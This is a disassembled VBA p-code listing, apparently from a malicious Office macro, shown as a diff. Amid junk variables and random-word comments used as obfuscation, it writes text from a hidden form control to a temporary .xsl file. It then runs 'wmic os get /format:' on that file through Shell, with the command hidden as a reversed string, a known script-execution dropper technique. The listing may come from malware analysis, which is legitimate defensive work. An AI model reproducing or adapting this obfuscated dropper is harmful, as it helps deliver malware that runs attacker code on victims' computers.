+	LitVarSpecial (True)
+	St aZ496I 
+Line #57:
+	QuoteRem 0x0000 0x0016 " Crevice anyone weight"
+Line #58:
+	Dim 
+	VarDefn aoG8er (As Integer)
+Line #59:
+	LitDI2 0x32BB 
+	UMi 
+	St aoG8er 
+Line #60:
+	SetStmt 
+	New a0woxm
+	Set aXtIkN 
+Line #61:
+Line #62:
+	Dim 
+	VarDefn aeoFY1 (As String)
+Line #63:
+	LitStr 0x0009 "ahnWZab3F"
+	St aeoFY1 
+Line #64:
+	Dim 
+	VarDefn aB2Hdp (As Integer)
+Line #65:
+	LitDI2 0x4FFD 
+	UMi 
+	St aB2Hdp 
+Line #66:
+	QuoteRem 0x0000 0x001B " Nocturnal talkative tricks"
+Line #67:
+	Dim 
+	VarDefn aUNrk7 (As Boolean)
+Line #68:
+	LitVarSpecial (True)
+	St aUNrk7 
+Line #69:
+	QuoteRem 0x0000 0x0018 " Spiral time-honored pos"
+Line #70:
+	Dim 
+	VarDefn akZUbfhQ (As Boolean)
+Line #71:
+	LitVarSpecial (False)
+	St akZUbfhQ 
+Line #72:
+	QuoteRem 0x0000 0x0016 " Mrna rouge bail enact"
+Line #73:
+	Dim 
+	VarDefn aHwPzG (As String)
+Line #74:
+	Dim 
+	VarDefn a01DumIa (As Boolean)
+Line #75:
+	LitVarSpecial (True)
+	St a01DumIa 
+Line #76:
+	Dim 
+	VarDefn aGTiU (As Boolean)
+Line #77:
+	LitVarSpecial (True)
+	St aGTiU 
+Line #78:
+	QuoteRem 0x0000 0x002C " Exercise thriller abstruse capuchin hitting"
+Line #79:
+	Ld aXtIkN 
+	MemLd auJtb 
+	MemLd Text 
+	St aHwPzG 
+Line #80:
+	Dim 
+	VarDefn aBb80q4Pa (As Integer)
+Line #81:
+	LitDI2 0x6195 
+	St aBb80q4Pa 
+Line #82:
+	Dim 
+	VarDefn auoGQw3 (As Long)
+Line #83:
+	LitDI2 0x5C77 
+	St auoGQw3 
+Line #84:
+	QuoteRem 0x0000 0x000F " Schools woolen"
+Line #85:
+	Dim 
+	VarDefn aFh7lS9d (As Integer)
+Line #86:
+	LitDI2 0x3490 
+	St aFh7lS9d 
+Line #87:
+	QuoteRem 0x0000 0x0023 " Wine variegated scsi ambrosia sale"
+Line #88:
+	Dim 
+	VarDefn aLBYw0 (As Boolean)
+Line #89:
+	LitVarSpecial (True)
+	St aLBYw0 
+Line #90:
+	Dim 
+	VarDefn agvpx (As String)
+Line #91:
+Line #92:
+	Dim 
+	VarDefn aDcZdG (As String)
+Line #93:
+	LitStr 0x0007 "anqr0aU"
+	St aDcZdG 
+Line #94:
+	QuoteRem 0x0000 0x0019 " Curves nz entities empty"
+Line #95:
+	Dim 
+	VarDefn axGbY (As String)
+Line #96:
+	LitStr 0x0005 "aTKDI"
+	St axGbY 
+Line #97:
+	Dim 
+	VarDefn aNSmdzfk1 (As String)
+Line #98:
+	LitStr 0x0007 "acSNTu5"
+	St aNSmdzfk1 
+Line #99:
+	QuoteRem 0x0000 0x001F " Internationally genealogy tish"
+Line #100:
+	Dim 
+	VarDefn awzhTkbMS (As Long)
+Line #101:
+	LitDI2 0x79E2 
+	UMi 
+	St awzhTkbMS 
+Line #102:
+	QuoteRem 0x0000 0x0025 " Lab challenging legitimately bracken"
+Line #103:
+	LitStr 0x0020 "C:\\Windows\\Temp\\aXwZvnt48.xsl"
+	St agvpx 
+Line #104:
+Line #105:
+	Dim 
+	VarDefn afemjKg97 (As String)
+Line #106:
+	LitStr 0x0005 "a6p87"
+	St afemjKg97 
+Line #107:
+	QuoteRem 0x0000 0x0003 " Nn"
+Line #108:
+	Dim 
+	VarDefn auM68Ag (As Long)
+Line #109:
+	LitDI2 0x42B2 
+	St auM68Ag 
+Line #110:
+	QuoteRem 0x0000 0x002B " Fortieth misrule gig showcase managed rind"
+Line #111:
+	Dim 
+	VarDefn aErQyi2gz (As String)
+Line #112:
+	LitStr 0x0008 "a6MTgPiQ"
+	St aErQyi2gz 
+Line #113:
+	Dim 
+	VarDefn aVcFDEi (As Long)
+Line #114:
+	LitDI2 0x1D13 
+	St aVcFDEi 
+Line #115:
+	LitDI2 0x0022 
+	ArgsLd Chr 0x0001 
+	St a7zKv 
+Line #116:
+	Dim 
+	VarDefn aiOM8J (As Integer)
+Line #117:
+	LitDI2 0x78DE 
+	St aiOM8J 
+Line #118:
+	QuoteRem 0x0000 0x0006 " Devon"
+Line #119:
+	Dim 
+	VarDefn aeAFaG4 (As String)
+Line #120:
+	LitStr 0x0005 "awFtB"
+	St aeAFaG4 
+Line #121:
+	Ld agvpx 
+	Ld aHwPzG 
+	ArgsCall (Call) adWspA8 0x0002 
+Line #122:
+	Dim 
+	VarDefn aB8pyl (As Boolean)
+Line #123:
+	LitVarSpecial (True)
+	St aB8pyl 
+Line #124:
+	QuoteRem 0x0000 0x000A " Diaphragm"
+Line #125:
+	Dim 
+	VarDefn aZfPL96 (As Long)
+Line #126:
+	LitDI2 0x7878 
+	St aZfPL96 
+Line #127:
+	QuoteRem 0x0000 0x0020 " Batman wellington aground grave"
+Line #128:
+	Dim 
+	VarDefn arN4esO (As String)
+Line #129:
+	LitStr 0x0005 "abWB7"
+	St arN4esO 
+Line #130:
+	QuoteRem 0x0000 0x001E " Toyota bedtime months aimless"
+Line #131:
+	Dim 
+	VarDefn ad48H (As Integer)
+Line #132:
+	LitDI2 0x1BAB 
+	St ad48H 
+Line #133:
+	QuoteRem 0x0000 0x0009 " Engineer"
+Line #134:
+	Dim 
+	VarDefn aQEnXN (As Integer)
+Line #135:
+	LitDI2 0x1DEC 
+	UMi 
+	St aQEnXN 
+Line #136:
+	QuoteRem 0x0000 0x0006 " Billy"
+Line #137:
+	Dim 
+	VarDefn aoGiXhZt6 (As Boolean)
+Line #138:
+	LitVarSpecial (True)
+	St aoGiXhZt6 
+Line #139:
+	QuoteRem 0x0000 0x003C " Internationally home pyramidal disable shorts academic snob"
+Line #140:
+	Dim 
+	VarDefn afTt6gON (As Long)
+Line #141:
+	LitDI2 0x0DA1 
+	St afTt6gON 
+Line #142:
+	QuoteRem 0x0000 0x0008 " Inertia"
+Line #143:
+	Dim 
+	VarDefn a2VbTxOCP (As String)
+Line #144:
+	LitStr 0x0008 "aYq8uRfA"
+	St a2VbTxOCP 
+Line #145:
+	Dim 
+	VarDefn aG2us (As Integer)
+Line #146:
+	LitDI2 0x0706 
+	UMi 
+	St aG2us 
+Line #147:
+	QuoteRem 0x0000 0x000F " Agreed origins"
+Line #148:
+	Dim 
+	VarDefn aWFvAHo5 (As Integer)
+Line #149:
+	LitDI2 0x76CA 
+	UMi 
+	St aWFvAHo5 
+Line #150:
+	QuoteRem 0x0000 0x0021 " Bereft trail porridge aurora tab"
+Line #151:
+	Dim 
+	VarDefn awbJZu (As Integer)
+Line #152:
+	LitDI2 0x4E5A 
+	UMi 
+	St awbJZu 
+Line #153:
+	QuoteRem 0x0000 0x0028 " Heterogeneous glutton perfidy boulevard"
+Line #154:
+	Dim 
+	VarDefn aR98iMO (As Integer)
+Line #155:
+	LitDI2 0x31DD 
+	UMi 
+	St aR98iMO 
+Line #156:
+	QuoteRem 0x0000 0x0029 " Mangy twenty-eighth law disproportionate"
+Line #157:
+	Dim 
+	VarDefn a7nUHBR (As String)
+Line #158:
+	LitStr 0x0005 "ahtex"
+	St a7nUHBR 
+Line #159:
+	Dim 
+	VarDefn aPWET (As Integer)
+Line #160:
+	LitDI2 0x2B25 
+	UMi 
+	St aPWET 
+Line #161:
+	QuoteRem 0x0000 0x0025 " Alloy boating abdication bahia small"
+Line #162:
+	Dim 
+	VarDefn a6JrwTD (As Boolean)
+Line #163:
+	LitVarSpecial (False)
+	St a6JrwTD 
+Line #164:
+	QuoteRem 0x0000 0x0018 " Dishes alleviate turkey"
+Line #165:
+	LitStr 0x0014 ":tamrof/ teg so cimw"
+	ArgsLd StrReverse 0x0001 
+	St a5rk9 
+Line #166:
+	Ld a5rk9 
+	Ld a7zKv 
+	Concat 
+	Ld agvpx 
+	Concat 
+	Ld a7zKv 
+	Concat 
+	LitDI2 0x0000 
+	ArgsCall Shell 0x0002 
+Line #167:
+Line #168:
+	Dim 
+	VarDefn a3Csw6Z1 (As String)
+Line #169:
+	LitStr 0x0008 "asfShVxb"
+	St a3Csw6Z1 
+Line #170:
+	QuoteRem 0x0000 0x0008 " Town pg"
+Line #171:
+	Dim 
+	VarDefn aBdjQApr (As Long)
+Line #172:
+	LitDI2 0x3856 
+	UMi 
+	St aBdjQApr 
+Line #173:
+	QuoteRem 0x0000 0x0026 " Eastern conservatory automobile whine"
+Line #174:
+	Dim 
+	VarDefn aL7hGU8 (As Boolean)
+Line #175:
+	LitVarSpecial (False)
+	St aL7hGU8 
+Line #176:
+	QuoteRem 0x0000 0x0007 " People"
+Line #177:
+Line #178:
+Line #179:
+	Dim 
+	VarDefn aD89R (As String)
+Line #180:
+	LitStr 0x0007 "aumS1Ky"
+	St aD89R 
+Line #181:
+	QuoteRem 0x0000 0x001C " Fidget metropolitan missile"
+Line #182:
+	Dim 
+	VarDefn alk15e (As String)
+Line #183:
+	LitStr 0x0007 "admxuKl"
+	St alk15e 
+Line #184:
+	QuoteRem 0x0000 0x000F " Thumbnail yolk"
+Line #185:
+	Dim 
+	VarDefn arbDG48VP (As Boolean)
+Line #186:
+	LitVarSpecial (False)
+	St arbDG48VP 
+Line #187:
+	QuoteRem 0x0000 0x0028 " Virility collective walked elated brush"
+Line #188:
+	Dim 
+	VarDefn a6WUx (As Boolean)
+Line #189:
+	LitVarSpecial (True)
+	St a6WUx 
+Line #190:
+	QuoteRem 0x0000 0x0006 " Shell"
+Line #191:
+	Dim 
+	VarDefn aBrSHazJU (As Boolean)
+Line #192:
+	LitVarSpecial (True)
+	St aBrSHazJU 
+Line #193:
+	QuoteRem 0x0000 0x0013 " Knowledge cartoons"
+Line #194:
+	Dim 
+	VarDefn ae6XvTqrf (As String)
+Line #195:
+	LitStr 0x0006 "a82GZf"
+	St ae6XvTqrf 
+Line #196:
+	QuoteRem 0x0000 0x0038 " Gary sofa journey techrepublic puzzles examinations rat"
+Line #197:
+	EndSub 
+VBA/a0woxm - 3379 bytes
+Line #0:
+	FuncDefn (Sub UserForm_Initialize())
+Line #1:
+	Dim 
+	VarDefn asMDNG4 (As Boolean)
+Line #2:
+	LitVarSpecial (False)
+	St asMDNG4 
+Line #3:
+	Dim 
+	VarDefn aDdyE (As String)
+Line #4:
+	LitStr 0x0008 "aZNvGXR8"
+	St aDdyE 
+Line #5:
+	Dim 
+	VarDefn azmrO5 (As Boolean)
+Line #6:
+	LitVarSpecial (True)
+	St azmrO5 
+Line #7:
+	QuoteRem 0x0000 0x0025 " Screw education maple eastern africa"
+Line #8:
+Line #9:
+	Dim 
+	VarDefn aKuZICr7 (As String)
+Line #10:
+	LitStr 0x0009 "anzkItGKb"
+	St aKuZICr7 
+Line #11:
+	QuoteRem 0x0000 0x000D " Conferencing"
+Line #12:
+	Dim 
+	VarDefn aDb701JOn (As Long)
+Line #13:
+	LitDI2 0x2718 
+	UMi 
+	St aDb701JOn 
+Line #14:
+	QuoteRem 0x0000 0x0024 " Worse interred bras liquids violate"
+Line #15:
+	EndSub 
+Line #16:
+	FuncDefn (Public Sub test())
+Line #17:
+Line #18:
+	Dim 
+	VarDefn a87qC0z (As String)
+Line #19:
+	LitStr 0x0006 "axHtYM"
+	St a87qC0z 
+Line #20:
+	QuoteRem 0x0000 0x000D " War membrane"
+Line #21:
+	Dim 
+	VarDefn azyFP3iH4 (As Boolean)
+Line #22:
+	LitVarSpecial (True)
+	St azyFP3iH4 
+Line #23:
+	QuoteRem 0x0000 0x000A " Pestilent"
+Line #24:
+	Dim 
+	VarDefn aYFmEgX (As String)
+Line #25:
+	LitStr 0x0009 "aEZnmITys"
+	St aYFmEgX 
+Line #26:
+	QuoteRem 0x0000 0x0023 " Tuneful delicious hughes valuation"
+Line #27:
+	EndSub 
